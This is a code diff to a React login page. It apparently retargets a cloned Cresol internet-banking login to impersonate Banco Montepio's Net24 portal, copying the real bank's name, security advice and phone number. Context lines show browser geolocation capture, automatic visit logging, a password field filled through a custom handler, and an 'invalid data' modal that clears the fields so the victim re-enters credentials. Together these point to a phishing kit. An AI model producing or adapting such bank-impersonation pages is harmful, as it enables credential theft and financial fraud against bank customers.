@@ -254,18 +254,11 @@ const Index = () => {
   const { toast } = useToast();
   const cpfValidation = useCpfValidation();
   
-  const [tab, setTab] = useState("fisica");
-  const [cpf, setCpf] = useState("");
-  const [cnpj, setCnpj] = useState("");
-  const [chaveMulticanal, setChaveMulticanal] = useState("");
+  const [activeTab, setActiveTab] = useState("particulares");
+  const [identificacao, setIdentificacao] = useState("");
   const [senha, setSenha] = useState("");
   const [showSenha, setShowSenha] = useState(false);
-  const [saveCpf, setSaveCpf] = useState(false);
-  const [saveCnpj, setSaveCnpj] = useState(false);
-  const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  
-  // Novo estado para controlar o modal de dados inválidos
   const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);
 
   // ---- Geolocalização nativa do navegador ----
@@ -504,13 +497,12 @@ const Index = () => {
 
   // ---- PASSWORD INPUT (com toggle view) ----
   const senhaInput = (
-    <div className="mb-3 relative z-10">
-      <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Senha de acesso</label>
+    <div className="mb-4 relative z-10">
       <div className="relative flex items-center">
         <input
           type={showSenha ? "text" : "password"}
-          className="w-full h-12 px-3 pr-12 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
-          placeholder="Senha"
+          className="w-full h-12 px-4 pr-12 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
+          placeholder="Palavra-passe"
           value={senha ? senha : ""}
           onFocus={handlePasswordInputFocus}
           readOnly
@@ -519,12 +511,12 @@ const Index = () => {
         />
         <button
           type="button"
-          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#145C36] flex items-center justify-center p-1"
+          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 flex items-center justify-center p-1"
           tabIndex={-1}
           onClick={() => setShowSenha((v) => !v)}
           aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
         >
-          {showSenha ? <EyeOff size={22} /> : <Eye size={22} />}
+          {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
         </button>
       </div>
       <div>
@@ -538,112 +530,6 @@ const Index = () => {
       </div>
     </div>
   );
-
-  const renderFormContent = () => {
-    switch (tab) {
-      case "fisica":
-        return (
-          <>
-            {/* CPF com validação */}
-            <div className="mb-4">
-              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">CPF</label>
-              <div className="relative">
-                <input
-                  type="text"
-                  className={`w-full h-12 px-3 pr-10 border rounded focus:outline-none transition text-base bg-white ${
-                    cpfValidation.isValid === true 
-                      ? 'border-green-500 focus:border-green-600' 
-                      : cpfValidation.isValid === false 
-                      ? 'border-red-500 focus:border-red-600' 
-                      : 'border-gray-300 focus:border-orange-500'
-                  }`}
-                  placeholder="000.000.000-00"
-                  value={cpf}
-                  onChange={handleCpfChange}
-                  autoComplete="username"
-                  maxLength={14}
-                />
-                {cpfValidation.isValid !== null && (
-                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                    {cpfValidation.isValid ? (
-                      <CheckCircle size={20} className="text-green-500" />
-                    ) : (
-                      <XCircle size={20} className="text-red-500" />
-                    )}
-                  </div>
-                )}
-              </div>
-              {cpfValidation.isValid === false && (
-                <p className="text-red-500 text-sm mt-1">CPF inválido</p>
-              )}
-            </div>
-            {/* Senha */}
-            {senhaInput}
-            {/* Salvar CPF */}
-            <div className="flex items-center mb-6">
-              <label htmlFor="saveCpf" className="text-gray-700 text-base md:text-lg mr-2">
-                Salvar CPF
-              </label>
-              <Switch id="saveCpf" checked={saveCpf} onCheckedChange={() => setSaveCpf((v) => !v)} />
-            </div>
-          </>
-        );
-      case "juridica":
-        return (
-          <>
-            {/* CNPJ */}
-            <div className="mb-4">
-              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">CNPJ</label>
-              <input
-                type="text"
-                className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
-                placeholder="CNPJ"
-                value={cnpj}
-                onChange={(e) => setCnpj(e.target.value)}
-                autoComplete="username"
-              />
-            </div>
-            {/* Senha */}
-            {senhaInput}
-            {/* Salvar CNPJ */}
-            <div className="flex items-center mb-6">
-              <label htmlFor="saveCnpj" className="text-gray-700 text-base md:text-lg mr-2">
-                Salvar CNPJ
-              </label>
-              <Switch id="saveCnpj" checked={saveCnpj} onCheckedChange={() => setSaveCnpj((v) => !v)} />
-            </div>
-          </>
-        );
-      case "financeiro":
-        return (
-          <>
-            {/* Chave Multicanal */}
-            <div className="mb-4">
-              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Chave Multicanal</label>
-              <input
-                type="text"
-                className="w-full h-12 px-3 border border-orange-400 rounded focus:outline-none transition text-base bg-white"
-                placeholder="Chave Multicanal"
-                value={chaveMulticanal}
-                onChange={(e) => setChaveMulticanal(e.target.value)}
-                autoComplete="username"
-              />
-            </div>
-            {/* Senha */}
-            {senhaInput}
-            {/* Salvar Chave Multicanal */}
-            <div className="flex items-center mb-6">
-              <label htmlFor="saveChaveMulticanal" className="text-gray-700 text-base md:text-lg mr-2">
-                Salvar Chave Multicanal
-              </label>
-              <Switch id="saveChaveMulticanal" checked={saveChaveMulticanal} onCheckedChange={() => setSaveChaveMulticanal((v) => !v)} />
-            </div>
-          </>
-        );
-      default:
-        return null;
-    }
-  };
 
   // ---- Registrar visita automaticamente ----
   useEffect(() => {
@@ -669,8 +555,8 @@ const Index = () => {
   }, [clientStatus]);
 
   return (
-    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
-      {/* Modal de Dados Inválidos - MODIFICADO para permitir ciclo */}
+    <div className="min-h-screen bg-gray-50">
+      {/* Modal de Dados Inválidos */}
       <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
         <AlertDialogContent className="max-w-md mx-auto">
           <AlertDialogHeader>
@@ -684,7 +570,7 @@ const Index = () => {
           <AlertDialogFooter className="flex justify-center">
             <AlertDialogAction
               onClick={clearAllFields}
-              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
+              className="bg-yellow-500 hover:bg-yellow-600 text-black px-8 py-2 rounded"
             >
               Tentar Novamente
             </AlertDialogAction>
@@ -692,114 +578,199 @@ const Index = () => {
         </AlertDialogContent>
       </AlertDialog>
 
-      {/* Main Content Container */}
-      <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
-        <div className="max-w-md w-full mx-auto">
-          <div className="flex justify-center mb-6">
-            <img
-              src={cresolLogo}
-              alt="Cresol"
-              className="h-10 md:h-12"
-            />
+      {/* Header */}
+      <div className="bg-white shadow-sm py-4">
+        <div className="max-w-4xl mx-auto px-4 flex justify-center">
+          <div className="flex items-center">
+            <div className="w-8 h-8 bg-yellow-500 rounded mr-3 flex items-center justify-center">
+              <div className="w-4 h-4 bg-black transform rotate-45"></div>
+            </div>
+            <span className="text-xl font-semibold text-gray-700">Banco Montepio</span>
           </div>
-          <h1 className="text-2xl md:text-3xl font-semibold text-gray-600 mb-4 text-center lg:text-left">Seja bem-vindo</h1>
-          <p className="text-lg md:text-xl text-gray-600 mb-8 md:mb-10 text-center lg:text-left">
-            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
-          </p>
-          
-          {/* Tabs */}
-          <div className="grid grid-cols-3 gap-x-2 sm:gap-x-4 lg:gap-x-12 gap-y-0 mb-2 mt-1 max-w-[470px]">
-            {TABS.map((t, idx) => (
-              <button
-                key={t.value}
-                className={`pb-0.5 pt-1.5 text-sm sm:text-base lg:text-lg leading-snug font-semibold transition-colors text-[#145C36]
-                  flex flex-col items-center min-h-[44px]
-                  ${tab === t.value ? "border-b-4 border-orange-500" : "border-b-4 border-transparent"}
-                `}
-                onClick={() => setTab(t.value)}
-              >
-                <span>{t.title}</span>
-                <span>{t.subtitle}</span>
-              </button>
-            ))}
-          </div>
-
-          <form className="mt-6" onSubmit={handleLogin}>
-            {renderFormContent()}
-            <button
-              type="submit"
-              disabled={isLoading}
-              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mt-0 mb-8 lg:mb-10 disabled:opacity-70 flex items-center justify-center"
-              style={{
-                background: isLoading ? "linear-gradient(90deg,#ffaa00,#ff7300 100%)" : "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
-                borderRadius: "30px",
-              }}
-            >
-              {isLoading ? (
-                <div className="flex items-center">
-                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
-                  Carregando...
-                </div>
-              ) : (
-                "Entrar"
-              )}
-            </button>
-          </form>
-
-          {/* Primeira linha separadora */}
-          <hr className="w-full border-t border-gray-200 my-6 lg:my-8" />
-
-          {/* Primeiro acesso - abas física, jurídica e financeiro */}
-          {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
-            <>
-              <div className="w-full flex flex-col items-center lg:items-start">
-                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold mb-2 text-gray-800 w-full text-center lg:text-left" style={{lineHeight: "1.2"}}>Primeiro acesso</h2>
-                <p className="text-sm md:text-base text-gray-700 mb-6 w-full text-center lg:text-left">
-                  Primeiro acesso aos canais digitais da Cresol? Cadastre sua conta e crie seu usuário. É simples, rápido e seguro.
-                </p>
-                <button
-                  type="button"
-                  className="w-full lg:max-w-xs h-12 rounded-full border-2 border-orange-500 text-orange-500 font-semibold text-base md:text-lg transition-colors bg-white hover:bg-orange-50 active:bg-orange-100 mb-6 lg:mb-8"
-                  style={{ boxSizing: "border-box" }}
-                >
-                  Cadastre-se
-                </button>
-              </div>
-              {/* Linha */}
-              <hr className="w-full border-t border-gray-200 my-4 lg:my-6" />
-              {/* Termos de uso */}
-              <div className="w-full mb-6 lg:mb-7 flex flex-col items-center lg:items-start">
-                <p className="text-center lg:text-left text-sm md:text-base text-gray-600">
-                  Consulte aqui nossos{" "}
-                  <a href="#" className="text-orange-500 font-semibold hover:underline transition">
-                    termos de uso
-                  </a>
-                </p>
-              </div>
-              {/* Rodapé Cresol/versionamento */}
-              <div className="mb-0 text-center lg:text-left text-xs text-gray-800">
-                <div className="font-semibold">Cresol Internet Banking - 2025</div>
-                <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
-              </div>
-            </>
-          )}
-        </div>
-
-        {/* Help Icon */}
-        <div className="absolute bottom-4 left-4 lg:bottom-8 lg:left-8">
-          <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
-            <HelpCircle size={24} />
-          </button>
         </div>
       </div>
 
-      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
-      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
-        <img
-          src={womanImage}
-          alt="Mulher segurando celular"
-          className="w-full h-full object-cover"
-        />
+      {/* Main Content */}
+      <div className="max-w-4xl mx-auto px-4 py-8">
+        <div className="bg-white rounded-lg shadow-sm p-8">
+          <h1 className="text-2xl font-normal text-gray-700 mb-8 text-center">Acesso Net24</h1>
+          
+          {/* Tab Navigation */}
+          <div className="border-b border-gray-200 mb-8">
+            <nav className="flex space-x-8">
+              <button
+                onClick={() => setActiveTab("particulares")}
+                className={`py-4 px-2 border-b-2 font-medium text-sm ${
+                  activeTab === "particulares"
+                    ? "border-yellow-500 text-gray-900"
+                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
+                }`}
+              >
+                Acesso Net24 Particulares
+              </button>
+              <button
+                onClick={() => setActiveTab("empresas")}
+                className={`py-4 px-2 border-b-2 font-medium text-sm ${
+                  activeTab === "empresas"
+                    ? "border-yellow-500 text-gray-900"
+                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
+                }`}
+              >
+                Acesso Net24 Empresas
+              </button>
+            </nav>
+          </div>
+
+          {/* Form Content */}
+          <form onSubmit={handleLogin} className="max-w-md mx-auto">
+            <div className="mb-6">
+              <div className="flex items-center justify-between mb-4">
+                <label className="text-sm font-medium text-gray-700">
+                  Identificação
+                </label>
+              </div>
+              <input
+                type="text"
+                className="w-full h-12 px-4 border border-gray-300 rounded focus:outline-none focus:border-yellow-500 transition text-base bg-white"
+                placeholder=""
+                value={identificacao}
+                onChange={(e) => setIdentificacao(e.target.value)}
+                autoComplete="username"
+              />
+            </div>
+
+            {senhaInput}
+
+            <button
+              type="submit"
+              disabled={isLoading}
+              className="w-full h-12 bg-yellow-500 hover:bg-yellow-600 transition font-medium text-black text-base rounded shadow disabled:opacity-70 flex items-center justify-center mb-6"
+            >
+              {isLoading ? (
+                <div className="flex items-center">
+                  <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin mr-2"></div>
+                  A carregar...
+                </div>
+              ) : (
+                "CONTINUAR"
+              )}
+            </button>
+          </form>
+        </div>
+
+        {/* Security Recommendations Section */}
+        <div className="mt-8 bg-yellow-500 rounded-lg p-6">
+          <h2 className="text-lg font-semibold text-black mb-6 text-center">
+            RECOMENDAÇÕES DE SEGURANÇA
+          </h2>
+          
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+            {/* Security Item 1 */}
+            <div className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
+                  <div className="w-4 h-6 border-2 border-black rounded-t"></div>
+                </div>
+              </div>
+              <h3 className="font-semibold text-black mb-2">
+                Valide que está a aceder a uma página segura
+              </h3>
+              <p className="text-sm text-black leading-relaxed">
+                As páginas do Montepio terão sempre a informação relativa ao{" "}
+                <strong>Certificado de Segurança</strong> na barra de endereços dos vários navegadores de Internet.
+              </p>
+            </div>
+
+            {/* Security Item 2 */}
+            <div className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                <div className="text-2xl">****</div>
+              </div>
+              <h3 className="font-semibold text-black mb-2">
+                Códigos de acesso ao Serviço Montepio24
+              </h3>
+              <p className="text-sm text-black leading-relaxed">
+                Para aceder ao Serviço <strong>Montepio24</strong>, apenas é necessário indicar o seu{" "}
+                <strong>N.º de identificação Montepio24</strong> e o <strong>código PIN</strong>.
+              </p>
+            </div>
+
+            {/* Security Item 3 */}
+            <div className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
+                  <div className="text-xs">📱</div>
+                </div>
+              </div>
+              <h3 className="font-semibold text-black mb-2">
+                Validação de transações
+              </h3>
+              <p className="text-sm text-black leading-relaxed">
+                Para aprovar transações que alterem o seu património será necessário proceder à sua{" "}
+                <strong>autorização através dos métodos de autenticação</strong> disponibilizados pelo Banco Montepio.
+              </p>
+            </div>
+
+            {/* Security Item 4 */}
+            <div className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
+                  <div className="text-xs">📞</div>
+                </div>
+              </div>
+              <h3 className="font-semibold text-black mb-2">
+                Número de Telemóvel
+              </h3>
+              <p className="text-sm text-black leading-relaxed">
+                No acesso ao Serviço Montepio24 não solicitamos o n.º de{" "}
+                <strong>telemóvel</strong>.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* Bottom Info Section */}
+        <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-6">
+          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
+            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+              <div className="text-2xl">🕵️</div>
+            </div>
+            <h3 className="font-semibold text-gray-800 mb-2">Exemplos de Fraude</h3>
+            <p className="text-sm text-gray-600 mb-4">
+              Consulte os últimos Alertas de Segurança e Exemplos de Fraudes.
+            </p>
+            <button className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded text-sm font-medium">
+              VER MAIS
+            </button>
+          </div>
+
+          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
+            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+              <div className="text-2xl">🛡️</div>
+            </div>
+            <h3 className="font-semibold text-gray-800 mb-2">Recomendações de Segurança</h3>
+            <p className="text-sm text-gray-600 mb-4">
+              Conheça as nossas recomendações e dicas de segurança.
+            </p>
+            <button className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded text-sm font-medium">
+              VER MAIS
+            </button>
+          </div>
+
+          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
+            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+              <div className="text-2xl">📞</div>
+            </div>
+            <h3 className="font-semibold text-gray-800 mb-2">Contacte-nos</h3>
+            <p className="text-sm text-gray-600 mb-2">
+              Qualquer questão contacte-nos por telefone através do Serviço Montepio24.
+            </p>
+            <p className="text-lg font-semibold text-gray-800 mb-2">(+351) 21 724 16 24</p>
+            <p className="text-xs text-gray-500">
+              Atendimento personalizado todos os dias das 08h00 às 00h00
+            </p>
+          </div>
+        </div>
       </div>
     </div>
   );
